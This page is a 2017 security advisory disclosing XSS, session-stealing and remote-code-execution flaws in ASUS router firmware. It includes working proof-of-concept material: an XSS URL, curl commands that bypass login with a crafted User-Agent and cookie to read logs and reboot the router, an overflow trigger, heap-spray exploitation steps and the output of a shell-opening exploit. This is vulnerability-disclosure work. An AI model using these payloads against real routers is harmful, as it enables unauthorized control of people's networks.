<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Multiple Vulnerabilities: Cross-Site Scripting (XSS), Session Stealing, Remote Code Execution in ASUSWRT (CVE-2017-6547, CVE-2017-6548, CVE-2017-6549).">
    <title>0xbb - ASUSWRT</title>
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="/images/favicon-152.png?ad510b8b07d33dcf41dd1e8ab9fbb93c">
    <link rel="icon" type="image/png" sizes="192x192" href="/images/favicon-192.png?18297a3410b436023ca466a57af85d78">
    <link rel="stylesheet" href="/css/style.min.css?aa098e29dc9c87bb137415d00c27295e">

    <style> spam  	 	 , #yolo.trololo[ingo$="awesome" ],spam {display:none}</style>
</head>
<body>
<div id="layout">
    <div id="main">
        <div class="header">
            <h1>0xbb</h1>
            <div class="pure-menu pure-menu-horizontal">
                 <ul class="pure-menu-list">
                    <li class="pure-menu-item ">
                        <a href="/" class="pure-menu-link">Home</a>
                    </li>
                    <li class="pure-menu-item "><a href="/notes/" class="pure-menu-link">
                        Notes</a>
                    </li>
                    <li class="pure-menu-item  pure-menu-selected ">
                        <a href="/projects/" class="pure-menu-link">Projects</a>
                    </li>
                </ul>
            </div>
        </div>

        <div class="content">




<h2 id="asuswrt-multiple-vulnerabilities">ASUSWRT - Multiple Vulnerabilities</h2>

<p><a href="https://www.asus.com/ASUSWRT/">ASUSWRT</a> is a wireless router operating system that powers many routers produced by ASUS. Multiple exploitable vulnerabilities could be identified in the current version of ASUSWRT.</p>

<p>Published: 08 Mar 2017</p>

<h3 id="affected-routers">Affected routers:</h3>

<ul>
<li>RT-AC53 (3.0.0.4.380.6038)</li>
<li>RT-N56U (3.0.0.4.380.7378)</li>
<li>RT-N66U (3.0.0.4.380.7378)</li>
<li>RT-AC66U (3.0.0.4.380.7378)</li>
<li>RT-N66R (3.0.0.4.380.7378)</li>
<li>RT-AC66R (3.0.0.4.380.7378)</li>
<li>RT-AC68U (3.0.0.4.380.7378)</li>
<li>RT-AC68R (3.0.0.4.380.7378)</li>
<li>RT-N66W (3.0.0.4.380.7378)</li>
<li>RT-AC68W (3.0.0.4.380.7266)</li>
<li>RT-AC66W (3.0.0.4.380.7378)</li>
<li>RT-AC87R (3.0.0.4.380.7378)</li>
<li>RT-AC87U (3.0.0.4.380.7378)</li>
<li>RT-AC51U (3.0.0.4.380.7378)</li>
<li>RT-AC68P (3.0.0.4.380.7378)</li>
<li>RT-N11P (3.0.0.4.380.7378)</li>
<li>RT-N12+ (3.0.0.4.380.7378)</li>
<li>RT-N12E B1 (3.0.0.4.380.7378)</li>
<li>RT-AC3200 (3.0.0.4.380.7378)</li>
<li>RT-AC53U (3.0.0.4.380.7378)</li>
<li>RT-N600 (3.0.0.4.380.9488)</li>
<li>RT-AC1750 (3.0.0.4.380.7378)</li>
<li>RT-AC1900P (3.0.0.4.380.7378)</li>
<li>RT-N300 (3.0.0.4.380.7378)</li>
<li>RT-N12+ B1 (3.0.0.4.380.9488)</li>
<li>RT-AC750 (3.0.0.4.380.7378)</li>
<li>RT-N11P B1 (3.0.0.4.380.9488)</li>
<li>RT-N12VP B1 (3.0.0.4.380.9488)</li>
<li>RT-N12E C1 (3.0.0.4.380.9488)</li>
<li>RT-N300 B1 (3.0.0.4.380.9488)</li>
<li>RT-N12+ Pro (3.0.0.4.380.9488)</li>
<li>&hellip;</li>
</ul>

<hr />

<h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3>

<p>Component: <strong><code>httpd</code></strong></p>

<p>CVE: <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6547">CVE-2017-6547</a></p>

<h4 id="vulnerability">Vulnerability:</h4>

<p><code>httpd</code> checks in the function <code>handle_request</code> if the requested file name is longer than 50 chars. It then responds with a redirection which allows an attacker to inject arbitrary JavaScript code into the router&rsquo;s web interface context.</p>
<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">...

<span style="color:#007020;font-weight:bold">if</span>(strlen(file) <span style="color:#666">&gt;</span> <span style="color:#40a070">50</span> <span style="color:#666">&amp;&amp;!</span>(strstr(file, <span style="color:#4070a0">&#34;findasus&#34;</span>)) <span style="color:#666">&amp;&amp;</span> <span style="color:#666">!</span>(strstr(file, <span style="color:#4070a0">&#34;acme-challenge&#34;</span>)))
{
    <span style="color:#902000">char</span> inviteCode[<span style="color:#40a070">256</span>];
    snprintf(inviteCode, <span style="color:#007020;font-weight:bold">sizeof</span>(inviteCode), <span style="color:#4070a0">&#34;&lt;script&gt;location.href=&#39;/cloud_sync.asp?flag=%s&#39;;&lt;/script&gt;&#34;</span>, file);
    send_page( <span style="color:#40a070">200</span>, <span style="color:#4070a0">&#34;OK&#34;</span>, (<span style="color:#902000">char</span><span style="color:#666">*</span>) <span style="color:#40a070">0</span>, inviteCode, <span style="color:#40a070">0</span>);

...</code></pre></div>
<h4 id="poc">PoC:</h4>

<pre><code>http://192.168.1.1/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';alert('XSS');'A
</code></pre>

<p><img src="/images/asuswrt-xss.png" alt="ASUSWRT XSS" /></p>

<hr />

<h3 id="session-stealing">Session Stealing</h3>

<p>Component: <strong><code>httpd</code></strong></p>

<p>CVE: <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6549">CVE-2017-6549</a></p>

<h4 id="vulnerability-1">Vulnerability:</h4>

<p><code>httpd</code> uses the function <code>search_token_in_list</code> to validate if a user is logged into the admin interface by checking his <code>asus_token</code> value.
There seems to be a branch which could be a failed attempt to build in a logout functionality.</p>
<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">asus_token_t<span style="color:#666">*</span> <span style="color:#06287e">search_token_in_list</span>(<span style="color:#902000">char</span><span style="color:#666">*</span> token, asus_token_t <span style="color:#666">**</span>prev)
{
    asus_token_t <span style="color:#666">*</span>ptr <span style="color:#666">=</span> head;
    asus_token_t <span style="color:#666">*</span>tmp <span style="color:#666">=</span> <span style="color:#007020">NULL</span>;
    <span style="color:#902000">int</span> found <span style="color:#666">=</span> <span style="color:#40a070">0</span>;
    <span style="color:#902000">char</span> <span style="color:#666">*</span>cp <span style="color:#666">=</span> <span style="color:#007020">NULL</span>;

    <span style="color:#007020;font-weight:bold">while</span>(ptr <span style="color:#666">!=</span> <span style="color:#007020">NULL</span>)
    {
        <span style="color:#007020;font-weight:bold">if</span>(<span style="color:#666">!</span>strncmp(token, ptr<span style="color:#666">-&gt;</span>token, <span style="color:#40a070">32</span>)) {
            found <span style="color:#666">=</span> <span style="color:#40a070">1</span>;
            <span style="color:#007020;font-weight:bold">break</span>;
        }
        <span style="color:#007020;font-weight:bold">else</span> <span style="color:#007020;font-weight:bold">if</span>(strncmp(token, <span style="color:#4070a0">&#34;cgi_logout&#34;</span>, <span style="color:#40a070">10</span>) <span style="color:#666">==</span> <span style="color:#40a070">0</span>) {
            cp <span style="color:#666">=</span> strtok(ptr<span style="color:#666">-&gt;</span>useragent, <span style="color:#4070a0">&#34;-&#34;</span>);

            <span style="color:#007020;font-weight:bold">if</span>(strcmp(cp, <span style="color:#4070a0">&#34;asusrouter&#34;</span>) <span style="color:#666">!=</span> <span style="color:#40a070">0</span>) {
                found <span style="color:#666">=</span> <span style="color:#40a070">1</span>;
                <span style="color:#007020;font-weight:bold">break</span>;
            }
        }
        <span style="color:#007020;font-weight:bold">else</span> {
            tmp <span style="color:#666">=</span> ptr;
            ptr <span style="color:#666">=</span> ptr<span style="color:#666">-&gt;</span>next;
        }
    }
    
    <span style="color:#007020;font-weight:bold">if</span>(found <span style="color:#666">==</span> <span style="color:#40a070">1</span>) {
        <span style="color:#007020;font-weight:bold">if</span>(prev)
            <span style="color:#666">*</span>prev <span style="color:#666">=</span> tmp;
        <span style="color:#007020;font-weight:bold">return</span> ptr;
    }   
    <span style="color:#007020;font-weight:bold">else</span> {
        <span style="color:#007020;font-weight:bold">return</span> <span style="color:#007020">NULL</span>;
    }
}</code></pre></div>
<p>If an attacker sets his cookie value to <code>cgi_logout</code> and puts <code>asusrouter-Windows-IFTTT-1.0</code> into his <code>User-Agent</code> header he will be treated as signed-in if any other administrator session is active.</p>

<h4 id="poc-1">PoC:</h4>
<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#60a0b0;font-style:italic"># read syslog</span>
curl -H <span style="color:#4070a0">&#39;User-Agent: asusrouter-Windows-IFTTT-1.0&#39;</span> -H <span style="color:#4070a0">&#39;Cookie: asus_token=cgi_logout&#39;</span> http://192.168.1.1/syslog.txt

<span style="color:#60a0b0;font-style:italic">#reboot router</span>
curl -H <span style="color:#4070a0">&#39;User-Agent: asusrouter-Windows-IFTTT-1.0&#39;</span> -H <span style="color:#4070a0">&#39;Cookie: asus_token=cgi_logout&#39;</span> http://192.168.1.1/apply.cgi1 -d <span style="color:#4070a0">&#39;action_mode=reboot&amp;action_script=&amp;action_wait=70&#39;</span></code></pre></div>
<p>It&rsquo;s possible to execute arbitrary commands on the router if any admin session is currently active.</p>

<hr />

<h3 id="remote-code-execution">Remote Code Execution</h3>

<p>Component: <strong><code>networkmap</code></strong></p>

<p>CVE: <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6548">CVE-2017-6548</a></p>

<p><code>networkmap</code> is responsible for generating a map of computers connected to the router. It continuously monitors the LAN to detect ARP requests submitted by unknown computers.
When a new MAC address appears it will probe the related IP address for running services like printer sharing, http server and also iTunes servers.</p>

<p>This is implemented by sending out multicast SSP discoveries:</p>

<pre><code>M-SEARCH * HTTP/1.1
HOST: 239.255.255.250:1900
ST:upnp:rootdevice
MAN:&quot;ssdp:discover&quot;
MX:3
</code></pre>

<p>A device can then respond with messages which indicate the location of the iTunes service.</p>

<pre><code>HTTP/1.1 200 OK
Location:HTTP://host:port/path
</code></pre>

<h4 id="vulnerability-2">Vulnerability:</h4>

<p>The function <code>process_device_repsonse</code> is responsible for parsing the SSDP answer:</p>
<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">                                                                                                                                             
<span style="color:#60a0b0;font-style:italic">/************************************************************************************************/</span>
<span style="color:#60a0b0;font-style:italic">// process the device response &#34;HTTP/1.1 200 OK&#34;
</span><span style="color:#60a0b0;font-style:italic"></span><span style="color:#902000">int</span> <span style="color:#06287e">process_device_response</span>(<span style="color:#902000">char</span> <span style="color:#666">*</span>msg)
{
        <span style="color:#902000">char</span> <span style="color:#666">*</span>line, <span style="color:#666">*</span>body, <span style="color:#666">*</span>p;                  <span style="color:#60a0b0;font-style:italic">// temporary variables
</span><span style="color:#60a0b0;font-style:italic"></span>        <span style="color:#902000">char</span> <span style="color:#666">*</span>location <span style="color:#666">=</span> <span style="color:#007020">NULL</span>;                  <span style="color:#60a0b0;font-style:italic">// the LOCATION: header
</span><span style="color:#60a0b0;font-style:italic"></span>        <span style="color:#902000">char</span> host[<span style="color:#40a070">16</span>], port[<span style="color:#40a070">6</span>];                 <span style="color:#60a0b0;font-style:italic">// the ip and port of the device
</span><span style="color:#60a0b0;font-style:italic"></span>        ushort destport;                        <span style="color:#60a0b0;font-style:italic">// the integer type of device port
</span><span style="color:#60a0b0;font-style:italic"></span>        <span style="color:#902000">char</span> <span style="color:#666">*</span>data <span style="color:#666">=</span> <span style="color:#007020">NULL</span>;                      <span style="color:#60a0b0;font-style:italic">// the data in packet
</span><span style="color:#60a0b0;font-style:italic"></span>        <span style="color:#902000">int</span> http_fd;                            <span style="color:#60a0b0;font-style:italic">// the http socket fd
</span><span style="color:#60a0b0;font-style:italic"></span>        <span style="color:#902000">int</span> nbytes;                             <span style="color:#60a0b0;font-style:italic">// recv number
</span><span style="color:#60a0b0;font-style:italic"></span>        <span style="color:#902000">int</span> i;
        <span style="color:#902000">char</span> <span style="color:#666">*</span>descri <span style="color:#666">=</span> <span style="color:#007020">NULL</span>;
        <span style="color:#902000">int</span> len;
	<span style="color:#007020;font-weight:bold">struct</span> timeval timeout<span style="color:#666">=</span>{<span style="color:#40a070">10</span>, <span style="color:#40a070">0</span>};

        <span style="color:#60a0b0;font-style:italic">//search &#34;\r\n\r\n&#34; or &#34;\r\n&#34; first appear place and judge whether msg have blank.
</span><span style="color:#60a0b0;font-style:italic"></span>        <span style="color:#007020;font-weight:bold">if</span>( (body <span style="color:#666">=</span> strstr(msg, <span style="color:#4070a0">&#34;</span><span style="color:#4070a0;font-weight:bold">\r\n\r\n</span><span style="color:#4070a0">&#34;</span>)) <span style="color:#666">!=</span> <span style="color:#007020">NULL</span>)
                body <span style="color:#666">+=</span><span style="color:#40a070">4</span>;
        <span style="color:#007020;font-weight:bold">else</span> <span style="color:#007020;font-weight:bold">if</span> ( (body <span style="color:#666">=</span> strstr(msg, <span style="color:#4070a0">&#34;</span><span style="color:#4070a0;font-weight:bold">\r\n</span><span style="color:#4070a0">&#34;</span>)) <span style="color:#666">!=</span> <span style="color:#007020">NULL</span>)
                body <span style="color:#666">+=</span><span style="color:#40a070">2</span>;
        <span style="color:#007020;font-weight:bold">else</span>
                <span style="color:#007020;font-weight:bold">return</span> <span style="color:#40a070">0</span>;
                                                                                                                                             
        p <span style="color:#666">=</span> msg;
        <span style="color:#60a0b0;font-style:italic">// find the LOCATION information.
</span><span style="color:#60a0b0;font-style:italic"></span>        <span style="color:#007020;font-weight:bold">while</span>( p<span style="color:#666">!=</span> <span style="color:#007020">NULL</span> <span style="color:#666">&amp;&amp;</span> p <span style="color:#666">&lt;</span> body)
        {
                line <span style="color:#666">=</span> strsep(<span style="color:#666">&amp;</span>p, <span style="color:#4070a0">&#34;</span><span style="color:#4070a0;font-weight:bold">\r\n</span><span style="color:#4070a0">&#34;</span>);      <span style="color:#60a0b0;font-style:italic">//divide up string
</span><span style="color:#60a0b0;font-style:italic"></span>                <span style="color:#007020;font-weight:bold">if</span>((strncmp(line, <span style="color:#4070a0">&#34;LOCATION:&#34;</span>, <span style="color:#40a070">9</span>) <span style="color:#666">==</span> <span style="color:#40a070">0</span>) <span style="color:#666">||</span> (strncmp(line, <span style="color:#4070a0">&#34;Location:&#34;</span>, <span style="color:#40a070">9</span>) <span style="color:#666">==</span> <span style="color:#40a070">0</span>))
                {
                        location <span style="color:#666">=</span> strip_chars(<span style="color:#666">&amp;</span>line[<span style="color:#40a070">9</span>], <span style="color:#4070a0">&#34;</span><span style="color:#4070a0;font-weight:bold">\t</span><span style="color:#4070a0">&#34;</span>);
                        location <span style="color:#666">=</span> strip_chars(<span style="color:#666">&amp;</span>line[<span style="color:#40a070">9</span>], <span style="color:#4070a0">&#34; &#34;</span>);
                        <span style="color:#007020;font-weight:bold">break</span>;
                }
        }
        NMP_DEBUG_F(<span style="color:#4070a0">&#34;UPnP location=%s</span><span style="color:#4070a0;font-weight:bold">\n</span><span style="color:#4070a0">&#34;</span>, location);
        <span style="color:#60a0b0;font-style:italic">//fprintf(fp_upnp, &#34;UPnP location=%s\n&#34;, location);//Yau                                                                                                                                     
</span><span style="color:#60a0b0;font-style:italic"></span>        <span style="color:#60a0b0;font-style:italic">// get the destination ip
</span><span style="color:#60a0b0;font-style:italic"></span>        location <span style="color:#666">+=</span> <span style="color:#40a070">7</span>;
	i <span style="color:#666">=</span> <span style="color:#40a070">0</span>;
	<span style="color:#007020;font-weight:bold">while</span>( (<span style="color:#666">*</span>location <span style="color:#666">!=</span> <span style="color:#4070a0">&#39;:&#39;</span>) <span style="color:#666">&amp;&amp;</span> (<span style="color:#666">*</span>location <span style="color:#666">!=</span> <span style="color:#4070a0">&#39;/&#39;</span>)) {
                host[i] <span style="color:#666">=</span> <span style="color:#666">*</span>location<span style="color:#666">++</span>;
		i<span style="color:#666">++</span>;
	}
        host[i] <span style="color:#666">=</span> <span style="color:#4070a0">&#39;\0&#39;</span>;
        <span style="color:#60a0b0;font-style:italic">//get the destination port
</span><span style="color:#60a0b0;font-style:italic"></span>        <span style="color:#007020;font-weight:bold">if</span>(<span style="color:#666">*</span>location <span style="color:#666">==</span> <span style="color:#4070a0">&#39;:&#39;</span>) {
            	<span style="color:#007020;font-weight:bold">for</span>(location<span style="color:#666">++</span>, i <span style="color:#666">=</span><span style="color:#40a070">0</span>; <span style="color:#666">*</span>location <span style="color:#666">!=</span> <span style="color:#4070a0">&#39;/&#39;</span>; i<span style="color:#666">++</span>)
                	port[i] <span style="color:#666">=</span> <span style="color:#666">*</span>location<span style="color:#666">++</span>;
            	port[i] <span style="color:#666">=</span> <span style="color:#4070a0">&#39;\0&#39;</span>;
            	destport <span style="color:#666">=</span> (ushort)atoi(port);
	}
	<span style="color:#007020;font-weight:bold">else</span>
		destport <span style="color:#666">=</span> <span style="color:#40a070">80</span>;</code></pre></div>
<p>It contains multiple buffer overflows in the parsing code for host and port.
This stack-based overflow can be used to gain control over <code>networkmap</code>&rsquo;s control flow by overwriting the saved <code>$pc</code> stored on the stack.</p>

<p>Parsing this message:</p>

<pre><code>HTTP/1.1 200 OK
Location:HTTP://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/
</code></pre>

<p>will overflow <code>host[16]</code> and lead to <code>$pc</code> being set to  <code>0x41414141</code> which is a starting point for further exploitation.</p>

<h4 id="exploitation">Exploitation:</h4>

<p>In order to develop a working exploit we gather further information of the system.</p>

<h5 id="general-information">General Information:</h5>

<p>ASUSWRT is based on Linux which is running on a little endian MIPS CPU.
The vulnerable program <code>networkmap</code> gets automatically started when the device boots and additionally gets restarted  by the <code>watchdog</code> process if it crashes.</p>

<pre><code># cat /proc/cpuinfo 
system type     : MT7620
processor       : 0
cpu model       : MIPS 24Kc V5.0
BogoMIPS        : 386.04
wait instruction    : yes
microsecond timers  : yes
tlb_entries     : 32
extra interrupt vector  : yes
hardware watchpoint : yes, count: 4, address/irw mask: [0x0000, 0x0ff8, 0x0ff8, 0x0ff8]
ASEs implemented    : mips16 dsp
shadow register sets    : 1
core            : 0
VCED exceptions     : not available
VCEI exceptions     : not available

# ps
  PID USER       VSZ STAT COMMAND
    1 admin     3940 S    /sbin/init
    2 admin        0 SW   [kthreadd]
    3 admin        0 SW   [ksoftirqd/0]
    4 admin        0 SW   [kworker/0:0]
    5 admin        0 SW   [kworker/u:0]
    6 admin        0 SW&lt;  [khelper]
    7 admin        0 SW   [sync_supers]
    8 admin        0 SW   [bdi-default]
    9 admin        0 SW&lt;  [kintegrityd]
   10 admin        0 SW&lt;  [kblockd]
   11 admin        0 SW   [kswapd0]
   12 admin        0 SW   [fsnotify_mark]
   13 admin        0 SW&lt;  [crypto]
   17 admin        0 SW   [mtdblock0]
   18 admin        0 SW   [mtdblock1]
   19 admin        0 SW   [mtdblock2]
   20 admin        0 SW   [mtdblock3]
   21 admin        0 SW   [mtdblock4]
   22 admin        0 SW   [mtdblock5]
   23 admin        0 SW   [kworker/u:1]
   30 admin        0 SW   [kworker/0:1]
   41 admin      660 S    hotplug2 --persistent --no-coldplug
   76 admin     3924 S    console
   78 admin     1276 S    /sbin/syslogd -m 0 -S -O /tmp/syslog.log -s 256 -l 6
   80 admin     1276 S    /sbin/klogd -c 5
   82 admin     1292 S    /bin/sh
  115 admin        0 SW   [RtmpCmdQTask]
  116 admin        0 SW   [RtmpWscTask]
  135 admin        0 SW   [RtmpCmdQTask]
  136 admin        0 SW   [RtmpWscTask]
  164 admin     3932 S    /sbin/wanduck
  168 admin     1128 S    dropbear -p 192.168.1.1:22 -a
  175 admin     3932 S    wpsaide
  189 nobody    1056 S    dnsmasq --log-async
  194 admin     2588 S    avahi-daemon: running [RT-AC53-B8F4.local]
  196 admin     4112 S    httpd -i br0
  197 admin     1068 S    /usr/sbin/infosvr br0
  199 admin     3932 S    watchdog
  201 admin     2180 S    rstats
  210 admin     1160 S    lld2d br0
  211 admin     3932 S    ots
  224 admin      800 S    miniupnpd -f /etc/upnp/config
  229 admin     1284 S    /sbin/udhcpc -i vlan2 -p /var/run/udhcpc0.pid -s /tmp/udhcpc -O33 -O249
  302 admin     1152 S    dropbear -p 192.168.1.1:22 -a
  303 admin     1300 S    -sh
  344 admin     1128 S    networkmap
  359 admin     1280 R    ps

# uname -a
Linux (none) 2.6.36 #1 Fri Sep 23 12:05:55 CST 2016 mips GNU/Linux
</code></pre>

<h5 id="memory-map">Memory Map:</h5>

<p><code>networkmap</code>&rsquo;s memory map is analyzed to continue exploiting the device.</p>

<pre><code># cat /proc/$(pidof networkmap)/maps
00400000-0040b000 r-xp 00000000 1f:04 270        /usr/sbin/networkmap
0041a000-0041b000 rw-p 0000a000 1f:04 270        /usr/sbin/networkmap
0041b000-0041f000 rwxp 00000000 00:00 0          [heap]
2b893000-2b894000 rw-p 00000000 00:00 0 
2b894000-2b89a000 r-xp 00000000 1f:04 828        /lib/ld-uClibc.so.0
2b89a000-2b8a0000 rw-s 00000000 00:04 0          /SYSV000003e9 (deleted)
2b8a0000-2b8a4000 rw-s 00000000 00:04 32769      /SYSV000003ea (deleted)
2b8a9000-2b8aa000 r--p 00005000 1f:04 828        /lib/ld-uClibc.so.0
2b8aa000-2b8ab000 rw-p 00006000 1f:04 828        /lib/ld-uClibc.so.0
2b8ab000-2b8d9000 r-xp 00000000 1f:04 258        /usr/lib/libshared.so
2b8d9000-2b8e8000 ---p 00000000 00:00 0 
2b8e8000-2b8eb000 rw-p 0002d000 1f:04 258        /usr/lib/libshared.so
2b8eb000-2b8ed000 rw-p 00000000 00:00 0 
2b8ed000-2b8ef000 r-xp 00000000 1f:04 235        /usr/lib/libnvram.so
2b8ef000-2b8ff000 ---p 00000000 00:00 0 
2b8ff000-2b900000 rw-p 00002000 1f:04 235        /usr/lib/libnvram.so
2b900000-2b90e000 r-xp 00000000 1f:04 760        /lib/libgcc_s.so.1
2b90e000-2b91e000 ---p 00000000 00:00 0 
2b91e000-2b91f000 rw-p 0000e000 1f:04 760        /lib/libgcc_s.so.1
2b91f000-2b95a000 r-xp 00000000 1f:04 827        /lib/libc.so.0
2b95a000-2b96a000 ---p 00000000 00:00 0 
2b96a000-2b96b000 rw-p 0003b000 1f:04 827        /lib/libc.so.0
2b96b000-2b96f000 rw-p 00000000 00:00 0 
2b970000-2b97f000 r--s 03eb0000 00:0c 78         /dev/nvram
7f8a7000-7f8c8000 rwxp 00000000 00:00 0          [stack]
7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso]
</code></pre>

<p>Observations:</p>

<ul>
<li><p>Partial ASLR is activated:</p>

<ul>
<li>Stack address is randomized</li>
<li>Library addresses are randomized</li>
<li>Program address is not randomized</li>
<li><strong>Heap</strong> address is not randomized</li>
</ul></li>

<li><p>There is no Stack-Protector</p></li>

<li><p>Both heap and stack are mapped <strong>executable</strong></p></li>

<li><p>The binary contains almost no gadgets suitable for building a ROP chain</p></li>
</ul>

<h4 id="exploit">Exploit:</h4>

<p>The final exploit consists of the following steps:</p>

<ol>
<li>Starting a webserver serving shellcode</li>
<li>Listening for multicast UDP messages send by the router</li>
<li>Database clearing / crashing: to make the heap layout predictable

<ul>
<li>Randomizing MAC address</li>
<li>Send message: jump to gadget that deletes <code>networkmap</code>&rsquo;s database and crashes</li>
<li><code>networkmap</code> will be restarted</li>
</ul></li>
<li>Spraying heap 1, 2:

<ul>
<li>Randomizing MAC address</li>
<li>Send message: containing the webserver&rsquo;s IP+port</li>
<li><code>networkmap</code> will receive shellcode and store it on the heap</li>
</ul></li>
<li>Starting payload

<ul>
<li>Randomize MAC address</li>
<li>Send message: jump to heap address containing the shellcode</li>
</ul></li>
<li>Connect to opened shell</li>
</ol>

<p>For further details check out the full exploit: <a href="/networkmap-pwn.py">networkmap-pwn.py</a></p>

<p>Example:</p>

<pre><code># ./networkmap-pwn.py
[-] starting webserver
[-] received SSP discovery
[-] clearing database and crashing
[-] received SSP discovery
[-] spraying heap 1/2
[-] got shellcode request
[-] sending shellcode
[-] received SSP discovery
[-] spraying heap 2/2
[-] received SSP discovery
[-] starting payload
[-] try to connect to shell
[-] try to connect to shell
[+] connected
Linux (none) 2.6.36 #1 Fri Sep 23 12:05:55 CST 2016 mips GNU/Linux
[+] pwned
</code></pre>





        </div>
    </div>
</div>
</body>
</html>